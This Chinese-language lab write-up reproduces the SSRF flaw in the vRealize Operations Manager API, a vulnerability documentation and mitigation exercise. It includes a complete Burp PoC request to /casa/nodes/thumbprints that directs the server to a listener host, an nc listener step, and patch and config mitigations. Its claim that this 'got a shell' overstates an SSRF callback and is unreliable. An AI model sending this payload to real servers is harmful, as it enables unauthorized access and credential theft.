## 0x00 简介

vRealize Operations
Manager是vmware官方提供的针对vmware虚拟化平台的一套运营管理解决方案，通过它可以看到整个虚拟化环境的整体运行情况，潜在风险，以及优化建议等，同时可以提供一些虚拟化运行配置、容量、优化建议等等报告。vRealize
Operations Manager
提供跨物理、虚拟和云基础架构的智能运维管理以及从应用程序到存储的可见性。使用基本策略的自动化，操作团队实现关键过程的自动化并提高 IT
效率。利用从系统资源（对象）中收集的数据，vRealize Operations Manager
通常能够在客户注意到问题之前识别任何受监控系统组件中的问题。vRealize Operations
Manager还经常会向您建议可用来立即修复问题的纠正措施。

## 0x01 漏洞概述

vRealize Operations Manager API中存在一个服务器端请求伪造漏洞，其CVSS评分为8.6。具有vRealize
Operations Manager API网络访问权限攻击者可以通过利用此漏洞执行服务器端请求伪造攻击，以窃取管理员凭据。

## 0x02 影响版本

    
    
    VMwarevRealizeOperations8.3.0、8.2.0、8.1.1、8.1.0、7.5.0  
    VMwareCloudFoundation4.x、3.x  
    vRealizeSuiteLifecycleManager8.x

## 0x03 环境搭建

1.下载ova文件

    
    
    https://my.vmware.com/group/vmware/patch

![image-20210730000521355](https://image.3001.net/images/20210802/1627891399_6107a6c724d3b5eb35189.png!small)

2.下载后导入vmware

选择部署选项

![image-20210730000547590](https://image.3001.net/images/20210802/1627891400_6107a6c85efe412df8ff9.png!small)

点击导入

![image-20210730000616251](https://image.3001.net/images/20210802/1627891401_6107a6c9778709aae7b60.png!small)

导入完成后记下显示的ip

![image-20210730000659132](https://image.3001.net/images/20210802/1627891402_6107a6ca60aeeadf54cce.png!small)

3.导入完成后打开访问虚拟机 ip 192.168.0.105，然后点击快速安装

![image-20210730000730235](https://image.3001.net/images/20210802/1627891403_6107a6cb42e0bf7d1316b.png!small)

直接点击下一步

![image-20210730000914655](https://image.3001.net/images/20210802/1627891404_6107a6cc3bdbe4ed33d75.png!small)

输入自己的密码，然后点击下一步

![image-20210730001048615](https://image.3001.net/images/20210802/1627891405_6107a6cd156d06b4c9cba.png!small)

点击下一步后开始安装

![image-20210730001105960](https://image.3001.net/images/20210802/1627891405_6107a6cdcfea2a18f2aa5.png!small)

等待安装完成之后，环境搭建就好了

![image-20210730001126341](https://image.3001.net/images/20210802/1627891406_6107a6ce95cb336f7ff5e.png!small)

## 0x04 漏洞复现

1.使用官方poc进行验证，bp抓包，action->repeater，替换为如下内容

    
    
    POST/casa/nodes/thumbprintsHTTP/1.1  
    Host:192.168.0.105  
    Connection:close  
    Cache-Control:max-age=0  
    sec-ch-ua:"Google Chrome";v="89","Chromium";v="89",";Not A Brand";v="99"  
    sec-ch-ua-mobile:?0  
    Upgrade-Insecure-Requests:1  
    User-Agent:Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/89.0.4389.90Safari/537.36  
    Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Content-Type:application/json;charset=UTF-8  
    Sec-Fetch-Site:none  
    Sec-Fetch-Mode:navigate  
    Sec-Fetch-User:?1  
    Sec-Fetch-Dest:document  
    Accept-Encoding:gzip,deflate  
    Accept-Language:zh-CN,zh;q=0.9  
    Content-Length:23  
    ​  
    ["192.168.0.104:4444"]

2.主机nc监听

![image-20210730092604649](https://image.3001.net/images/20210802/1627891407_6107a6cf6320e31ef15d2.png!small)

3.BurpSuite 发送payload

![image-20210730092810776](https://image.3001.net/images/20210802/1627891408_6107a6d098a1ab2600c10.png!small)

4.成功拿到shell

![image-20210730092915372](https://image.3001.net/images/20210802/1627891410_6107a6d22738b4ad365ee.png!small)

## 0x05 防护建议

1.官方提供的固件补丁，可访问进行下载

<https://www.vmware.com/security/advisories/VMSA-2021-0004.html>

2.从casa-security-context.xml 中删除配置行 。

1)通过 SSH 或控制台以 root 身份登录主节点，在控制台中按 ALT+F1 进行登录。

2)在文本编辑器中打开/usr/lib/vmware-casa/casa-webapp/webapps/casa/WEB-INF/classes/spring/casa-security-context.xml。

3)找到并删除以下行：

<sec:http pattern="/nodes/thumbprints" security='none'/>

4)保存并关闭文件。

5)重启 CaSA 服务：

服务 vmware-casa 重启

6)在 vRealize Operations 群集中的所有其他节点上重复步骤 1-5。

